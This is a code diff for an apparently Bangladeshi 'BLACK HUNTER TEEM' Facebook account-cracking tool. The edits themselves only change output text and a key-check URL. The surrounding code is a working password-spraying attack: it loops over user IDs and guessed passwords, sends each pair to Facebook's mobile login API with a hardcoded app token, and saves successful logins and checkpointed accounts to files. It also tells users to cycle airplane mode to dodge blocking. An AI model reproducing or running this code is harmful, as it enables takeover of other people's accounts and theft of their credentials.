@@ -41,7 +41,7 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TO KNOW ABOUT UPDATES  :)"%(G))
-	subprocess.check_output(["am", "start", "https://github.com/BLACK-HUNTER-TEEM/black-lovers/blob/main/Apruved.txt"])
+	subprocess.check_output(["am", "start", "https://github.com/BLACK-HUNTER-TEEM/blob/main/Apruved.txt"])
 	exit(" [*] FACEBOOK :  https://www.facebook.com/support.192")
 
 
@@ -72,7 +72,7 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		try:
-			plr = requests.get('https://github.com/BLACK-HUNTER-TEEM/black-lovers/blob/main/Apruved.txt').text
+			plr = requests.get('https://github.com/BLACK-HUNTER-TEEM/blob/main/Apruved.txt').text
 			if basesplit in plr:
 				key = basesplit
 				stat = ("\033[0;92mPREMIUM")
@@ -113,7 +113,7 @@ class Main:
   | | | |___| | | || |  | |           
   \_/ \____/\_| |_/\_|  |_/
 \033[1;90m══════════════════════════════════════════════════
-\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MD EMAZ UDDIN RAKIB/  BD JAHIED
+\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : MD EMAZ UDDIN RAKIB/BD JAHIED
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BLACK HUNTER TEEM
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : BLACK HUNTER TEEM
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : 😈WE--ARE--BACK😈
@@ -156,8 +156,8 @@ class Main:
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK RESULTS SAVED IN ->Black- ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> Black-cp.txt"%(Y))
+				print("\n%s [+] OK RESULTS SAVED IN ->BLACK- ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> BLACK-cp.txt"%(Y))
 				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
@@ -170,7 +170,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [Black] : %s/%s -> \033[0;92m [ Black-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [BLACK] : %s/%s -> \033[0;92m [ Black-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -187,12 +187,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m   [Black-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [BLACK-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [Black-CP] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m   [BLACK-CP] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
